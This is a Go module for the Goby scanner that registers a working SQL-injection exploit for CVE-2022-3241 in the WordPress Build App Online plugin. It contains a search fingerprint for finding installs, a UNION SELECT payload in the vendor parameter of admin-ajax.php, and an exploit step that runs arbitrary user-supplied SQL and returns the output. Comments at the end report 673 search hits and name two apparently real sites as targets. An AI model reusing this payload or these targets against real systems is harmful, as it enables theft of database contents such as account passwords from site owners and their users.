package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Build App Online admin-ajax.php vendor SQL Vulnerability (CVE-2022-3241)",
    "Description": "<p>WordPress plugin Build App Online is a plugin that helps you create and run mobile apps for woocommerce.</p><p>WordPress plugin Build App Online version before 1.0.19 has a SQL injection vulnerability. The vulnerability stems from the fact that some parameters are not properly cleaned and escaped before the SQL statement uses them, resulting in SQL injection, and the attacker can obtain sensitive information such as account passwords. information.</p>",
    "Product": "wordpress-plugin-build-app-online",
    "Homepage": "https://wordpress.org/plugins/build-app-online/",
    "DisclosureDate": "2022-09-20",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/plugins/build-app-online\"",
    "GobyQuery": "body=\"wp-content/plugins/build-app-online\"",
    "Level": "2",
    "Impact": "<p>WordPress plugin Build App Online version before 1.0.19 has a SQL injection vulnerability. The vulnerability stems from the fact that some parameters are not properly cleaned and escaped before the SQL statement uses them, resulting in SQL injection, and the attacker can obtain sensitive information such as account passwords. information.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/build-app-online/.\">https://wordpress.org/plugins/build-app-online/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/a995dd67-43fc-4087-a7f1-5db57f4c828c"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "@@version,user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=build-app-online-vendor_reviews&vendor=-3065%20UNION%20ALL%20SELECT%209921,md5(123),9921,9921,9921,9921,9921,9921,CONCAT(0x7178787671,0x7861526f436a41565347426143717a5a6a566a5843757a78637879477970635357517456746f6d44,0x7162626b71),9921",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=build-app-online-vendor_reviews&vendor=-3065%20UNION%20ALL%20SELECT%209921,{{{sql}}},9921,9921,9921,9921,9921,9921,CONCAT(0x7178787671,0x7861526f436a41565347426143717a5a6a566a5843757a78637879477970635357517456746f6d44,0x7162626b71),9921",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-3241"
    ],
    "CNNVD": [
        "CNNVD-202301-082"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress Build App Online 插件 admin-ajax.php 文件 vendor 参数 SQL注入漏洞（CVE-2022-3241）",
            "Product": "wordpress-plugin-build-app-online",
            "Description": "<p>WordPress plugin Build App Online 是一款帮助您为 woocommerce 创建和运行移动应用程序的插件。<br></p><p>WordPress plugin Build App Online 1.0.19之前版本存在SQL注入漏洞，该漏洞源于在SQL语句使用某些参数之前，没有正确地清理和转义这些参数从而导致SQL注入，攻击者可获取账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/build-app-online/\">https://wordpress.org/plugins/build-app-online/</a>。<br></p>",
            "Impact": "<p>WordPress plugin Build App Online 1.0.19之前版本存在SQL注入漏洞，该漏洞源于在SQL语句使用某些参数之前，没有正确地清理和转义这些参数从而导致SQL注入，攻击者可获取账号密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Build App Online admin-ajax.php vendor SQL Vulnerability (CVE-2022-3241)",
            "Product": "wordpress-plugin-build-app-online",
            "Description": "<p>WordPress plugin Build App Online is a plugin that helps you create and run mobile apps for woocommerce.<br></p><p>WordPress plugin Build App Online version before 1.0.19 has a SQL injection vulnerability. The vulnerability stems from the fact that some parameters are not properly cleaned and escaped before the SQL statement uses them, resulting in SQL injection, and the attacker can obtain sensitive information such as account passwords. information.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/build-app-online/.\">https://wordpress.org/plugins/build-app-online/.</a><br></p>",
            "Impact": "<p>WordPress plugin Build App Online version before 1.0.19 has a SQL injection vulnerability. The vulnerability stems from the fact that some parameters are not properly cleaned and escaped before the SQL statement uses them, resulting in SQL injection, and the attacker can obtain sensitive information such as account passwords. information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//zoomeye查询结果:673
//https://payfastmarket.com
//https://www.dokan.co.in